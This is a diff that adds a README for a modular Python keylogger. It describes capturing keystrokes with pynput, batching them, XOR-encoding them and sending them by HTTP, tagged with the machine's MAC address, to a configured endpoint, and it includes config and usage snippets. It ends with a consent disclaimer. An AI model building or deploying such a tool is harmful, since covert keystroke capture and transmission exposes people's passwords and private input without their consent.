@@ -1,0 +1,168 @@
+# KeyLogger Project
+
+### Overview
+
+This project is a modular keylogger implemented in Python. The system is designed with clear separation of concerns:
+
+* **Listener** – captures keyboard input.
+* **Container** – stores captured key events in batches over time.
+* **Encryption** – encodes key data before sending.
+* **Saving / Writers** – sends data to a destination (e.g., HTTP endpoint).
+* **Manager** – coordinates listener, container, encryption, and saving.
+
+---
+
+## Project Structure
+
+```
+project/
+├─ keylogger/
+│  ├─ __init__.py
+│  ├─ main.py                # Entry point
+│  ├─ manager.py             # KeyLoggerManager class
+│  ├─ listener.py            # Listener interface / concrete listener
+│  ├─ container.py           # Container class
+├─ encryptions/
+│  ├─ __init__.py
+│  ├─ xor.py                 # XOR encryption implementation
+├─ writers/
+│  ├─ __init__.py
+│  ├─ networkWriter.py       # HttpWriter class for sending data
+├─ utils/
+│  ├─ __init__.py
+│  ├─ conversions_utils.py   # Time conversion utilities
+│  ├─ network_utils.py       # get_mac_address()
+├─ config.py                 # Configuration dictionary
+└─ README.md
+```
+
+---
+
+## Installation
+
+1. Clone the repository:
+
+```bash
+git clone https://github.com/XXXXXX/keylogger.git
+cd keylogger
+```
+
+2. Create a virtual environment:
+
+```bash
+python3 -m venv venv
+source venv/bin/activate  # Linux/macOS
+# or
+venv\Scripts\activate     # Windows
+```
+
+3. Install dependencies:
+
+```bash
+pip install -r requirements.txt
+```
+
+Dependencies:
+
+* `pynput` – to capture keyboard events
+* `requests` – to send data over HTTP
+
+---
+
+## Configuration
+
+All parameters are defined in `config.py`:
+
+```python
+from encryptions.xor import Xor
+from utils.network_utils import get_mac_address
+from writers.networkWriter import HttpWriter
+
+CONFIG = {
+    "destination": 'http://127.0.0.1:5000/update',
+    "saving": HttpWriter,
+    "save_interval_value": 1,
+    "save_interval_unit": 'seconds',
+    "container_interval_value": 1,
+    "container_interval_units": 'seconds',
+    "encryption": Xor,
+    "key_encryption": 7,
+    "machine_id": get_mac_address()
+}
+```
+
+* **destination** – HTTP endpoint for sending data
+* **saving** – Writer class to handle saving/transmitting
+* **save\_interval\_value/unit** – Frequency to flush container and send data
+* **container\_interval\_value/unit** – Frequency to create a new container batch
+* **encryption** – Encryption class to encode keystrokes
+* **key\_encryption** – Key for encryption
+* **machine\_id** – Unique machine identifier (MAC address)
+
+---
+
+## Usage
+
+```python
+from keylogger.manager import KeyLoggerManager
+from config import CONFIG
+
+if __name__ == "__main__":
+    manager = KeyLoggerManager(
+        destination=CONFIG["destination"],
+        saving=CONFIG["saving"],
+        save_interval_value=CONFIG["save_interval_value"],
+        save_interval_unit=CONFIG["save_interval_unit"],
+        container_interval_value=CONFIG["container_interval_value"],
+        container_interval_unit=CONFIG["container_interval_units"],
+        encryption=CONFIG["encryption"],
+        key_encryption=CONFIG["key_encryption"],
+        machine_id=CONFIG["machine_id"]
+    )
+    manager.run()
+```
+
+---
+
+## Components
+
+### `KeyLoggerManager`
+
+* Coordinates the **listener**, **container**, **encryption**, and **saving**.
+* Runs a worker thread to periodically flush the container and send encrypted data.
+
+### `Container`
+
+* Stores captured keystrokes in time-based batches.
+* Thread-safe using `Lock`.
+* Supports `add()`, `pop_ready()`, and `flush()`.
+
+### `Listener`
+
+* Abstract interface (`IListener`) for capturing keyboard input.
+* Concrete implementations capture keystrokes using `pynput.keyboard`.
+
+### `Encryption`
+
+* Abstract base class (`Encryption`) with `encode()` method.
+* `Xor` class provides XOR-based encryption of keystrokes.
+
+### `Writers`
+
+* Abstract writer interface for saving/transmitting data.
+* `HttpWriter` sends encrypted data to a remote server.
+
+### `Utils`
+
+* `conversions_utils.py` – converts time units to seconds.
+* `network_utils.py` – provides `get_mac_address()` to retrieve the machine's MAC address.
+
+---
+
+## Notes
+
+* Each component is in its own file to ensure modularity and maintainability.
+* Configuration is centralized in `config.py` for easy modification.
+* Designed to run cross-platform with `pynput` and `requests`.
+
+💡 Tip: Always test in a safe environment. This project captures keystrokes and should **never** be run on systems you don’t own or without consent.
